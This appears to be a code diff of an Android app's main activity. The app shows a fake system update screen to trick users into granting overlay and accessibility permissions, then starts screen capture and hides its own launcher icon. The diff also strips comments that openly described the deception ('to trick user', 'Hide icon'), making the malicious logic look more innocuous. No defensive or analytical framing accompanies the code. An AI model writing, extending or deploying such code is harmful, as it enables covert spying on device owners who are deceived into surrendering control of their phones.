@@ -9,40 +9,33 @@ import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.compose.foundation.layout.*
 import androidx.compose.material3.*
+import androidx.compose.runtime.Composable
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.unit.dp
-import androidx.activity.result.contract.ActivityResultContracts
 
 class MainActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Request overlay permission automatically
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                 Uri.parse("package:$packageName"))
             startActivity(intent)
         }
 
-        // Request accessibility permission
-        // We guide user to settings
         val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-        // We show Compose UI to trick user
         setContent {
             MaterialTheme {
-                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
+                Surface(
+                    modifier = Modifier.fillMaxSize(),
+                    color = MaterialTheme.colorScheme.background
+                ) {
                     FakeUpdateScreen(
-                        onEnableAccessibility = {
-                            // After "Enable" button, we launch accessibility settings
-                            startActivity(accessibilityIntent)
-                        },
+                        onEnableAccessibility = { startActivity(accessibilityIntent) },
                         onProceed = {
-                            // After permissions granted, start screen capture
                             startScreenCapture()
-                            // Hide icon
-                            val pkg = applicationContext.packageName
                             packageManager.setComponentEnabledSetting(
                                 componentName,
                                 android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -57,8 +50,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startScreenCapture() {
-        val intent = Intent(this, ScreenPermissionActivity::class.java)
-        startActivity(intent)
+        startActivity(Intent(this, ScreenPermissionActivity::class.java))
     }
 }
 
